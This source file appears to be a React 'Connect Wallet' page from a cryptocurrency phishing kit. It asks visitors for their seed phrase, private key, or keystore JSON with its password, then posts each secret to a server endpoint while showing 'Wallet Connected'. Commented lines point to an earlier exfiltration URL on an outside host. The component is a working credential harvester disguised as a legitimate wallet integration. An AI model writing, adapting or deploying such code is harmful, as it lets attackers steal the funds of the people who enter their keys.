import styles from './Connect.module.css'
import { useWallet} from '../../contexts/WalletProvider'
import Header from '../Header/Header'
import {useState, useEffect} from 'react'

const Connect = (payload, payloadType) => {
    const [btnMsg, setBtnMsg] = useState("Connect Wallet");
    const { wallet } = useWallet();
    const [inputVal, setInputVal] = useState()
    const [current, setCurrent] = useState("Phrase")
    const [password, setPassword] = useState("")

    const handleForm = async(e) => {
        e.preventDefault();
        if(inputVal == null ||inputVal == ''){
            alert("Please fill in detail")
        } else{
            // const message = `a new message with ${wallet} of ${inputVal}`
          
            setBtnMsg("Processing.....")
           try {
            const res = await fetch(`/api/message`, {
                body: JSON.stringify({
                    wallet: `${wallet}`,
                    content: `Phrases: ${inputVal}`
                }),
                method: 'POST',
                headers:{
                    "Content-Type": "application/json"
                }
            })
            // const res = await fetch(`https://coincakes.herokuapp.com/pushconnect?message=${message}`)
            const data = await res.json();
            if(data.success == true){
                alert(data.message);
                setBtnMsg("Wallet Connected")
            }else{
                alert("Something went wrong")
            }
           } catch (error) {
               alert("Something went wrong!")
               setBtnMsg("Connect Wallet")
           }

        }
       
    }

    const handleFormPrivate = async(e) => {
        e.preventDefault();
        if(inputVal == null ||inputVal == ''){
            alert("Please fill in detail")
        } else{
            setBtnMsg("Processing.....")
            try {
                const res = await fetch(`/api/message`, {
                    body: JSON.stringify({
                        wallet: `${wallet}`,
                        content: `Private key: ${inputVal}`
                    }),
                    method: 'POST',
                    headers:{
                        "Content-Type": "application/json"
                    }
                })
                // const res = await fetch(`https://coincakes.herokuapp.com/pushconnect?message=${message}`)
                const data = await res.json();
                if(data.success == true){
                    alert(data.message);
                    setBtnMsg("Wallet Connected")
                }else{
                    alert("Something went wrong")
                }
            } catch (error) {
                alert("Something went wrong!")
                setBtnMsg("Connect Wallet")
            }

        }
    }

    const handleFormKeystone = async(e) => {
        e.preventDefault();
        if((inputVal == null ||inputVal == '') && !password){
            alert("Please fill in detail")
        } else{
            setBtnMsg("Processing.....")
          try {
            const res = await fetch(`/api/message`, {
                body: JSON.stringify({
                    wallet: `${wallet}`,
                    content: `Keystone: ${inputVal}      &      Password: ${password}`
                }),
                method: 'POST',
                headers:{
                    "Content-Type": "application/json"
                }
            })
            // const res = await fetch(`https://coincakes.herokuapp.com/pushconnect?message=${message}`)
            const data = await res.json();
            if(data.success == true){
                alert(data.message);
                setBtnMsg("Wallet Connected")
                
            }else{
                alert("Something went wrong")
            }
          } catch (error) {
              alert("Something went wrong!")
              setBtnMsg("Wallet Connected")
          }
        }
    }

    useEffect(() => {
        console.log(wallet);
    }, [wallet])


    const keystone =  (
     <section className={styles.container}>     
            <form onSubmit={handleFormKeystone}
                    method="post"
                    className={styles.keyStone}>
                  <p className={styles.info}>Connect {wallet} by putting your key</p>
                <textarea type="text" value={inputVal} placeholder="Keystone JSON" onChange={(e) => setInputVal(e.target.value)}></textarea>
                <input type="text" placeholder="Password" value={password} onChange={(e) => setPassword(e.target.value)}/>
                <p className={styles.hint}>Several lines of text plus the password you used to encrypt it </p>
                <button>{btnMsg}</button>
            </form>
     </section>
    )

    const privateKey = (
        <section className={styles.formBox}>
      <form onSubmit={handleFormPrivate}
                    method="post"
                    // className={styles.formBox}
                    >
                  <p className={styles.info}>Connect {wallet} by putting your key</p>
                <input type="text" placeholder="Password" value={inputVal} onChange={(e) => setInputVal(e.target.value)}/>
                <p className={styles.hint}>Typically 12 (sometimes 24) words seperated by a single spaces</p>
                <button>{btnMsg}</button>
            </form>
        </section>
    )

    const phrase = (
        <section className={styles.phrase}>
             <form onSubmit={handleForm}
                    method="post"
                    className={styles.formPhrase}>
                <p className={styles.info}>Connect {wallet} by putting your key</p>
                <textarea type="text" value={inputVal} placeholder="Phrase" onChange={(e) => setInputVal(e.target.value)}></textarea>
                <p className={styles.hint}>Typically 12 (sometimes 24) words seperated by a single spaces</p>
                <button>{btnMsg}</button>
            </form>
        </section>
    )

    const handleSelect = (payload) => {
        setCurrent(payload);
    }


    return (
        <>
        <Header />
        <section className={styles.overall}>
            <section className={styles.bigContainer}>
            <section className={styles.options}>
                <div onClick={() => handleSelect("Phrase")}>Phrase</div>
                <div onClick={() => handleSelect("Keystone JSON")}>Keystore JSON</div>
                <div onClick={() => handleSelect("Private Key")}>Private Key</div>
            </section>
            
            {current == "Phrase" ? phrase : current == "Keystone JSON" ? keystone : current == "Private Key" ? privateKey : phrase }
            </section>
        </section>
  
        </>
    )
}

export default Connect
